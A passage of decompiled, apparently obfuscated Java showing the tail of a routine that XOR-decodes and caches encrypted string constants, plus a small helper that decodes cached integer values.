                    break;
                }
                case 251: {
                    n6 = 35;
                    break;
                }
                case 252: {
                    n6 = 128;
                    break;
                }
                case 253: {
                    n6 = 95;
                    break;
                }
                case 254: {
                    n6 = 9;
                    break;
                }
                default: {
                    n6 = 194;
                }
            }
            int n7 = n6;
            int n8 = (n3 & 0xFF) - n7;
            if (n8 < 0) {
                n8 += 256;
            }
            if ((n5 = ((n3 & 0xFFFF) >>> 8) - n7) < 0) {
                n5 += 256;
            }
            int n9 = 0;
            while (n9 < cArray.length) {
                int n10 = n9 % 2;
                int n11 = n9;
                char[] cArray2 = cArray;
                char c2 = cArray[n11];
                if (n10 == 0) {
                    cArray2[n11] = (char)(c2 ^ n8);
                    n8 = ((n8 >>> 3 | n8 << 5) ^ cArray[n9]) & 0xFF;
                } else {
                    cArray2[n11] = (char)(c2 ^ n5);
                    n5 = ((n5 >>> 3 | n5 << 5) ^ cArray[n9]) & 0xFF;
                }
                ++n9;
            }
            ad.d[n4] = new String(cArray).intern();
        }
        return d[n4];
    }

    private static int a(int n2, long l2) {
        int n3 = n2 ^ (int)(l2 & 0x7FFFL) ^ 0x4B4D;
        if (f[n3] == null) {
            ad.f[n3] = (int)(e[n3] ^ l2);
        }
        return f[n3];
    }
}

